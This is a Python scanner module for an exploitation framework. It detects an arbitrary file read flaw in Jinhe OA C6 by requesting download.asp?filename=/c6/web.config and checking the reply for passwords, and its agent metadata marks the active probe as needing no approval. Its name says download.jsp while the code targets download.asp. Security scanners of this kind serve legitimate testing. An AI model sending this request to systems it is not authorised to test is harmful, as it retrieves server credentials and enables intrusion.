#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary file read vulnerability in Jinhe OA C6 download."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jinhe OA C6 download.jsp - Arbitary File Read Detection',
        'description': 'There is an arbitrary file read vulnerability in Jinhe OA C6 download.jsp file, through which an attacker can obtain sensitive information in the server',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'jinhe', 'lfi', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
    }

    def run(self):
        r = self.http_request(method="GET", path='/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<configuration>',)
        header_any = ('filename=', 'application/octet-stream')
        # Require ASPX/config shape + download headers; avoid lone "password=" matches.
        if (
            '<configuration>' in body
            and 'password=' in body.lower()
            and any(m in headers for m in header_any)
        ):
            self.set_info(
                severity='high',
                reason="Jinhe OA C6 download.asp - Arbitrary File Read detected",
                path='/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config',
            )
            return True
        return False

